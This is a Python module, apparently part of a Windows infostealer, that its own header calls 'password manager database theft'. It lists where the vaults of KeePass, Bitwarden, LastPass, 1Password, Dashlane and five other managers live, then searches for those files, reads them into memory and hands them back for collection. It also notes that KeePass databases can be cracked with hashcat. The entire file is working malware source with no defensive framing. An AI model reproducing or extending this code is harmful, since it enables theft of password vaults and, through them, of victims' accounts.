# modules/password_managers.py - Password manager database theft

import os
import shutil
from pathlib import Path
from config import LOCAL, ROAMING, log

# Password manager paths
PASSWORD_MANAGERS = {
    # KeePass variants
    'KeePass': {
        'paths': [
            os.getenv('USERPROFILE') + '\\Documents',
            os.getenv('USERPROFILE') + '\\Desktop',
            os.getenv('USERPROFILE') + '\\Downloads',
            ROAMING + '\\KeePass',
        ],
        'extensions': ['.kdbx'],
        'description': 'KeePass database (can be cracked with hashcat)'
    },
    
    # Bitwarden
    'Bitwarden': {
        'paths': [
            ROAMING + '\\Bitwarden',
        ],
        'files': ['data.json'],
        'description': 'Bitwarden vault data'
    },
    
    # LastPass
    'LastPass': {
        'paths': [
            LOCAL + '\\LastPass',
        ],
        'files': ['*.lps'],
        'description': 'LastPass vault cache'
    },
    
    # 1Password
    '1Password': {
        'paths': [
            LOCAL + '\\1Password',
            ROAMING + '\\1Password',
        ],
        'extensions': ['.sqlite', '.1pif'],
        'description': '1Password vault database'
    },
    
    # Dashlane
    'Dashlane': {
        'paths': [
            ROAMING + '\\Dashlane',
            LOCAL + '\\Dashlane',
        ],
        'extensions': ['.db', '.aes'],
        'description': 'Dashlane vault database'
    },
    
    # NordPass
    'NordPass': {
        'paths': [
            LOCAL + '\\NordPass',
            ROAMING + '\\NordPass',
        ],
        'files': ['*.db'],
        'description': 'NordPass vault'
    },
    
    # RoboForm
    'RoboForm': {
        'paths': [
            LOCAL + '\\RoboForm',
        ],
        'extensions': ['.rfo'],
        'description': 'RoboForm password files'
    },
    
    # Enpass
    'Enpass': {
        'paths': [
            ROAMING + '\\Enpass',
        ],
        'extensions': ['.walletx'],
        'description': 'Enpass wallet database'
    },
}

def find_files_by_extension(base_paths, extensions, max_depth=3):
    """Recursively find files with specific extensions"""
    found_files = []
    
    for base_path in base_paths:
        if not os.path.exists(base_path):
            continue
        
        try:
            for root, dirs, files in os.walk(base_path):
                # Limit recursion depth
                depth = root[len(base_path):].count(os.sep)
                if depth > max_depth:
                    continue
                
                for file in files:
                    file_ext = os.path.splitext(file)[1].lower()
                    if file_ext in extensions:
                        full_path = os.path.join(root, file)
                        try:
                            file_size = os.path.getsize(full_path)
                            # Skip very large files (>100MB)
                            if file_size > 100 * 1024 * 1024:
                                continue
                            
                            found_files.append(full_path)
                        except:
                            pass
        except:
            continue
    
    return found_files

def find_specific_files(base_paths, filenames):
    """Find specific named files"""
    found_files = []
    
    for base_path in base_paths:
        if not os.path.exists(base_path):
            continue
        
        try:
            for root, dirs, files in os.walk(base_path):
                for filename_pattern in filenames:
                    if '*' in filename_pattern:
                        # Wildcard matching
                        import fnmatch
                        for file in files:
                            if fnmatch.fnmatch(file, filename_pattern):
                                full_path = os.path.join(root, file)
                                found_files.append(full_path)
                    else:
                        # Exact match
                        if filename_pattern in files:
                            full_path = os.path.join(root, filename_pattern)
                            found_files.append(full_path)
        except:
            continue
    
    return found_files

def steal_password_manager(manager_name, config):
    """Steal password manager database files"""
    stolen_files = []
    
    paths = config.get('paths', [])
    
    # Check for extension-based search
    if 'extensions' in config:
        files = find_files_by_extension(paths, config['extensions'])
        stolen_files.extend(files)
    
    # Check for specific file search
    if 'files' in config:
        files = find_specific_files(paths, config['files'])
        stolen_files.extend(files)
    
    if not stolen_files:
        return None
    
    # Read file contents
    file_data = {}
    for file_path in stolen_files:
        try:
            with open(file_path, 'rb') as f:
                file_name = os.path.basename(file_path)
                file_data[file_name] = f.read()
            log(f"Grabbed {file_name} from {manager_name}")
        except:
            pass
    
    return file_data if file_data else None

def grab():
    """Main password manager stealing function"""
    log("Grabbing password manager databases...")
    
    pm_data = {}
    
    for manager_name, config in PASSWORD_MANAGERS.items():
        files = steal_password_manager(manager_name, config)
        if files:
            pm_data[manager_name] = {
                'description': config.get('description', ''),
                'files': files
            }
    
    if pm_data:
        log(f"Found {len(pm_data)} password managers")
        return pm_data
    
    log("No password managers found")
    return None